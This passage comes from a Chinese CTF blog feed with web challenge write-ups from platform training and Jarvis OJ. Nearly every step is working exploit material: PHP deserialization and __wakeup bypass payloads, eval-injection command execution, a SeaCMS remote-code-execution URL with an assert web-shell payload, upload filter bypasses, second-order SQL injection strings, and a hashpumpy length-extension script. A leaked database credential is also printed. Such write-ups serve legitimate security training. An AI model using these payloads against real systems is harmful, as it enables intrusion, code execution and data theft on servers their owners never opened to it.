class="xml">&#123;</span></span><br><span class="line"><span class="xml">$login = unserialize(gzuncompress(base64_decode($requset['token'])));</span></span><br><span class="line"><span class="xml">$db = new db();</span></span><br><span class="line"><span class="xml">$row = $db-&gt;select('user=\''.mysql_real_escape_string($login['user']).'\'');</span></span><br><span class="line"><span class="xml">if($login['user'] === 'ichunqiu')</span></span><br><span class="line"><span class="xml">&#123;</span></span><br><span class="line"><span class="xml">echo $flag;</span></span><br><span class="line"><span class="xml">&#125;else if($row['pass'] !== $login['pass'])&#123;</span></span><br><span class="line"><span class="xml">echo 'unserialize injection!!';</span></span><br><span class="line"><span class="xml">&#125;else&#123;</span></span><br><span class="line"><span class="xml">echo "(鈺�碘枴鈥�)鈺傅鈹粹攢鈹� ";</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"><span class="xml">&#125;else&#123;</span></span><br><span class="line"><span class="xml">header('Location: index.php?error=1');</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">?&gt; --&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>得知要得到flag需要满足 $login[‘user’] === ‘ichunqiu’</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$zzzz = <span class="keyword">array</span>(<span class="string">'user'</span> =&gt; <span class="string">'ichunqiu'</span> );</span><br><span class="line">$zzzz = base64_encode(gzcompress(serialize($zzzz)));</span><br><span class="line"><span class="keyword">echo</span> $zzzz;</span><br><span class="line"></span><br><span class="line"><span class="comment"># eJxLtDK0qi62MrFSKi1OLVKyLraysFLKTM4ozSvMLFWyrgUAo4oKXA==</span></span><br></pre></td></tr></table></figure></li><li><p>添加token</p><blockquote><p>flag{7ac94bdb-28be-48d2-a66c-45dcbbe8b277}</p></blockquote></li></ol><h1 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h1><blockquote><p>这只是第一步，然后呢？</p></blockquote><ol><li><p>进来点击跳转到/index.php?key=123&amp;hash=f9109d5f83921a551cf859f853afe7bb</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you are <span class="number">123</span>;<span class="keyword">if</span> you are <span class="keyword">not</span> <span class="number">123</span>,you can get the flag&lt;br&gt;&lt;!--<span class="symbol">$</span>hash=md5(<span class="symbol">$</span><span class="built-in">sign</span>.<span class="symbol">$</span>key);the length of <span class="symbol">$</span><span class="built-in">sign</span> is <span class="number">8</span></span><br></pre></td></tr></table></figure></li><li><p>f9109d5f83921a551cf859f853afe7bb解密得到kkkkkk01123,取其前8位就是kkkkkk01,构造如下key=000,md5(是kkkkkk01000)</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">key</span>=<span class="number">000</span>&amp;hash=<span class="number">62</span>f31428f8199e34d987a423e1fe17e8</span><br></pre></td></tr></table></figure></li><li><p>得到next step is Gu3ss_m3_h2h2.php，访问</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $file = <span class="string">'Gu3ss_m3_h2h2.php'</span>; </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;file = $file; </span></span><br><span class="line"><span class="php">    &#125; </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span></span><br><span class="line"><span class="php">    &#125; </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'Gu3ss_m3_h2h2.php'</span>) &#123; </span></span><br><span class="line"><span class="php">            <span class="comment">//the secret is in the f15g_1s_here.php </span></span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;file = <span class="string">'Gu3ss_m3_h2h2.php'</span>; </span></span><br><span class="line"><span class="php">        &#125; </span></span><br><span class="line"><span class="php">    &#125; </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>])) &#123; </span></span><br><span class="line"><span class="php">    $var = base64_decode($_GET[<span class="string">'var'</span>]); </span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $var)) &#123; </span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>); </span></span><br><span class="line"><span class="php">    &#125; <span class="keyword">else</span> &#123; </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        @unserialize($var); </span></span><br><span class="line"><span class="php">    &#125; </span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123; </span></span><br><span class="line"><span class="php">    highlight_file(<span class="string">"Gu3ss_m3_h2h2.php"</span>); </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></li><li><p>绕过正则和_wakeup(),<a href="https://paper.seebug.org/39/" target="_blank" rel="noopener">参考</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'Gu3ss_m3_h2h2.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'Gu3ss_m3_h2h2.php'</span>) &#123;</span><br><span class="line">            <span class="comment">//the secret is in the f15g_1s_here.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'Gu3ss_m3_h2h2.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Demo(<span class="string">'f15g_1s_here.php'</span>);</span><br><span class="line">$s = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $s;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">$s = str_replace(<span class="string">'O:4'</span>, <span class="string">'O:+4'</span>,$s);<span class="comment">//绕过正则</span></span><br><span class="line">$s = str_replace(<span class="string">':1:'</span>, <span class="string">':2:'</span> ,$s);<span class="comment">//绕过wakeup函数</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode($s);<span class="comment">//最后base64编码</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czoxNjoiZjE1Z18xc19oZXJlLnBocCI7fQ==</span></span><br></pre></td></tr></table></figure></li><li><p>访问/Gu3ss_m3_h2h2.php?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czoxNjoiZjE1Z18xc19oZXJlLnBocCI7fQ==</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'val'</span>])) &#123; </span></span><br><span class="line"><span class="php">    $val = $_GET[<span class="string">'val'</span>]; </span></span><br><span class="line"><span class="php">    <span class="keyword">eval</span>(<span class="string">'$value="'</span> . addslashes($val) . <span class="string">'";'</span>); </span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123; </span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'hahaha!'</span>); </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></li><li><p>val=${eval($_GET[a])}&amp;a=echo%20`ls`;<a href="https://www.ctolib.com/topics-24823.html" target="_blank" rel="noopener">ThinkPHP框架任意代码执行漏洞的利用</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Gu3ss_m3_h2h2<span class="selector-class">.php</span> True_F1ag_i3_Here_233<span class="selector-class">.php</span> f15g_1s_here<span class="selector-class">.php</span> index.php</span><br></pre></td></tr></table></figure></li><li><p>val=${eval($_GET[a])}&amp;a=echo%20`cat%20True_F1ag_i3_Here_233.php`;</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$flag = <span class="string">'flag&#123;29743eee-3e44-408f-ad70-c9638ec3a2dc&#125;'</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></li></ol><h1 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h1><blockquote><p>善于查资料，你就可以拿一血了。</p></blockquote><ol><li>直接看这个<a href="https://balis0ng.com/post/dai-ma-shen-ji/2016-11-02" target="_blank" rel="noopener">海洋cms前台任意代码执行</a></li><li>/search.php?searchtype=5&amp;tid=0&amp;year=23334444);phpinfo();//成功执行</li><li>/search.php?searchtype=5&amp;tid=0&amp;year=23334444);assert($_POST[1]);//一句话链接</li><li><p>找到数据库信息/var/www/html/data/common.inc.php</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">//数据库连接信息</span></span></span><br><span class="line"><span class="php">$cfg_dbhost = <span class="string">'127.0.0.1'</span>;</span></span><br><span class="line"><span class="php">$cfg_dbname = <span class="string">'seacms'</span>;</span></span><br><span class="line"><span class="php">$cfg_dbuser = <span class="string">'sea_user'</span>;</span></span><br><span class="line"><span class="php">$cfg_dbpwd = <span class="string">'46e06533407e'</span>;</span></span><br><span class="line"><span class="php">$cfg_dbprefix = <span class="string">'sea_'</span>;</span></span><br><span class="line"><span class="php">$cfg_db_language = <span class="string">'utf8'</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></li><li><p>SELECT `flag` FROM `flag_140ad2e0d8cb`</p><blockquote><p>flag{0b6238f2-2960-4364-8cec-86b3f89c3586}</p></blockquote></li></ol><h1 id="123"><a href="#123" class="headerlink" title="123"></a>123</h1><blockquote><p>12341234，然后就解开了</p></blockquote><ol><li><p>主页是登录框,看下源码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 用户信息都在user.php里 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 用户默认默认密码为用户名+出生日期 例如:zhangwei1999 --&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>访问user.php页面为空，访问user.php.bak发现泄露</p></li><li>burpsuite进行爆破，最后得到<blockquote><p>username=lixiuyun&amp;password=lixiuyun1990</p></blockquote></li><li><p>成功登陆，但发现是空白页</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 存在漏洞需要去掉  --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;form action="" method="POST" enctype="multipart/form-data"&gt;</span></span><br><span class="line"><span class="comment">&lt;input type="file" name="file" /&gt;</span></span><br><span class="line"><span class="comment">&lt;input type="submit" name="submit" value="上传" /&gt;</span></span><br><span class="line"><span class="comment">&lt;/form&gt; --&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>审查元素去掉注释</p></li><li>php2, php3, php4, php5, phps, pht, phtm, phtml 均试下。</li><li><p>123.png.phtml绕过</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/view.php"</span>&gt;</span>view<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>进去提示file?尝试/view.php?file=flag.php</p><blockquote><p>filter “flag”</p></blockquote></li><li>被过滤了，双写绕过/view.php?file=fflaglag<blockquote><p>flag{42e5f4e8-ed11-4358-891f-10b4e37f719b}</p></blockquote></li></ol><h1 id="phone-number"><a href="#phone-number" class="headerlink" title="phone number"></a>phone number</h1><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">106.75</span><span class="number">.72</span><span class="number">.168</span>:<span class="number">3333</span></span><br><span class="line">Phone <span class="built_in">number</span> is <span class="keyword">a</span> good thing.</span><br></pre></td></tr></table></figure><ol><li>注册接口发现手机可以传入十六进制表示的数据,这里存在二次注入，即我们构造恶意十六进制，然后登陆时check可以查看数据库信息</li><li>因为查询接口是数字型查询，并没有使用单引号，直接1 union即可</li><li><p>以下是通过注册时更改手机号来进行注入,用户密码自己决定</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1 union <span class="keyword">select</span> <span class="keyword">database</span>() <span class="comment">#0x3120756e696f6e2073656c6563742064617461626173652829</span></span><br><span class="line">回显：webdb</span><br><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">#0x3120756e696f6e2073656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829</span></span><br><span class="line">回显：<span class="keyword">user</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">#0x3120756e696f6e2073656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f736368656d613d64617461626173652829</span></span><br><span class="line">回显：<span class="keyword">id</span>,username,phone,<span class="keyword">password</span></span><br></pre></td></tr></table></figure></li><li><p>这里要注意一点，check的时候别忘了看源码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 听说admin的电话藏着大秘密哦～--&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><del>所以我们直接查admin的密码即可</del>,然而一直返回<strong>db error!</strong>,其实是phone</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> <span class="title">phone</span> <span class="title">from</span> <span class="title">user</span> <span class="comment">#0x3120756e696f6e2073656c6563742070686f6e652066726f6d2075736572</span></span></span><br><span class="line">回显：flag&#123;<span class="number">6</span>dd303b0-<span class="number">8</span>fce-<span class="number">2396</span>-<span class="number">9</span>ad8-d9f7a72f84b0&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>ps:返回的信息很多，Ctrl+F找flag试一下</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;sql&quot;&gt;&lt;a href=&quot;#sql&quot; class=&quot;headerlink&quot; title=&quot;sql&quot;&gt;&lt;/a&gt;sql&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;出题人就告诉你这是个注入，有种别走！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;一波测试发现select、order等关键字被过滤了,但是可以用&amp;lt;&amp;gt;绕过
    
    </summary>
    
      <category term="平台训练" scheme="https://cy9nusg4rd3n.github.io/categories/%E5%B9%B3%E5%8F%B0%E8%AE%AD%E7%BB%83/"/>
    
    
      <category term="Web" scheme="https://cy9nusg4rd3n.github.io/tags/Web/"/>
    
      <category term="SQL" scheme="https://cy9nusg4rd3n.github.io/tags/SQL/"/>
    
      <category term="php" scheme="https://cy9nusg4rd3n.github.io/tags/php/"/>
    
      <category term="审计" scheme="https://cy9nusg4rd3n.github.io/tags/%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Jarvis OJ(二)</title>
    <link href="https://cy9nusg4rd3n.github.io/2019/09/27/Jarvis-OJ-%E4%BA%8C/"/>
    <id>https://cy9nusg4rd3n.github.io/2019/09/27/Jarvis-OJ-二/</id>
    <published>2019-09-27T12:24:42.000Z</published>
    <updated>2020-04-18T03:31:11.386Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="flag在管理员手里"><a href="#flag在管理员手里" class="headerlink" title="flag在管理员手里"></a>flag在管理员手里</h1><p>题目链接：<a href="http://web.jarvisoj.com:32778/" target="_blank" rel="noopener">http://web.jarvisoj.com:32778/</a></p><blockquote><p>只有管理员才能获得flag，你能想办法获得吗？</p></blockquote><a id="more"></a><ol><li>进去现实<strong>Only Admin can see the flag!!</strong></li><li><p>抓包发现</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span>: role=s<span class="number">%3</span>A5<span class="number">%3</span>A<span class="number">%22</span>guest<span class="number">%22</span><span class="number">%3</span>B;</span><br><span class="line"><span class="attribute">hsh</span>=3a4727d57463f122833d9e732f94e4e0</span><br></pre></td></tr></table></figure></li><li><p>其中role=s:5:”guest”,改为Admin后</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">&lt;b&gt;</span>Notice<span class="params">&lt;/b&gt;</span>:  unserialize(): Error at offset <span class="number">11</span> of <span class="number">11</span> bytes in <span class="params">&lt;b&gt;</span><span class="meta-keyword">/opt/</span>lampp<span class="meta-keyword">/htdocs/</span>index.php<span class="params">&lt;/b&gt;</span> on line <span class="params">&lt;b&gt;</span><span class="number">19</span><span class="params">&lt;/b&gt;</span><span class="params">&lt;br /&gt;</span></span><br><span class="line"><span class="params">&lt;h3&gt;</span>Only Admin can see the flag!!<span class="params">&lt;/h3&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>是一个反序列化的报错,估计跟hsh有关，要怎么找呢？</p></li><li><p>“/index.php~”发现源码泄露,打开乱码,这其实是index.php的备份恢复文件，修改文件名为.index.php.swp，输入命令vim -r index.php得到恢复后的index.php。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Web <span class="number">350</span>&lt;/title&gt;</span><br><span class="line">&lt;style type=<span class="string">"text/css"</span>&gt;</span><br><span class="line">    body &#123;</span><br><span class="line">        background:gray;</span><br><span class="line">        text-align:center;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        $auth = <span class="keyword">false</span>;</span><br><span class="line">        $role = <span class="string">"guest"</span>;</span><br><span class="line">        $salt =</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"role"</span>])) &#123;</span><br><span class="line">            $role = unserialize($_COOKIE[<span class="string">"role"</span>]);</span><br><span class="line">            $hsh = $_COOKIE[<span class="string">"hsh"</span>];</span><br><span class="line">            <span class="keyword">if</span> ($role===<span class="string">"admin"</span> &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[<span class="string">"role"</span>]))) &#123;</span><br><span class="line">                $auth = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $auth = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $s = serialize($role);</span><br><span class="line">            setcookie(<span class="string">'role'</span>,$s);</span><br><span class="line">            $hsh = md5($salt.strrev($s));</span><br><span class="line">            setcookie(<span class="string">'hsh'</span>,$hsh);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin. Your flag is</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            echo "</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class="string">";</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    ?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>典型的hash拓展长度攻击，但这里不知道salt的长度，需要爆破</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import hashpumpy</span><br><span class="line">import urllib</span><br><span class="line">import requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">m=hashpumpy.hashpump(<span class="string">'3a4727d57463f122833d9e732f94e4e0'</span>,<span class="string">';\"tseug\":5:s'</span>,<span class="string">';\"nimda\":5:s'</span>,i)</span><br><span class="line">print i</span><br><span class="line">url=<span class="string">'http://web.jarvisoj.com:32778/'</span></span><br><span class="line">digest=m[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">message=urllib.quote(urllib.unquote(m[<span class="number">1</span>])[::-<span class="number">1</span>])</span><br><span class="line">cookie=<span class="string">'role='</span>+message+<span class="string">'; hsh='</span>+digest</span><br><span class="line"><span class="comment">#print cookie</span></span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">'cookie'</span>: cookie,</span><br><span class="line"><span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'</span>,</span><br><span class="line"><span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line"><span class="string">'Accept-Language'</span>: <span class="string">':zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</span><br><span class="line"><span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span></span><br><span class="line">&#125;</span><br><span class="line">print headers</span><br><span class="line">re=requests.get(url=url,headers=headers)</span><br><span class="line">print re.text</span><br><span class="line"><span class="keyword">if</span> <span class="string">"Welcome"</span> <span class="keyword">in</span> re.text:</span><br><span class="line">print re;</span><br><span class="line"><span class="keyword">exit</span>()</span><br></pre></td></tr></table></figure></li><li><p>最终得到salt长度为12</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">12</span><br><span class="line">&#123;'Accept-Language': ':zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3', 'cookie': 'role=s%3A5%3A%22admin%22%3B%00%00%00%00%00%00%00%C0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80s%3A5%3A%22guest%22%3B; hsh=fcdc3840332555511c4e4323f6decb07', 'Accept-Encoding': 'gzip, deflate', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'&#125;</span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Web 350<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 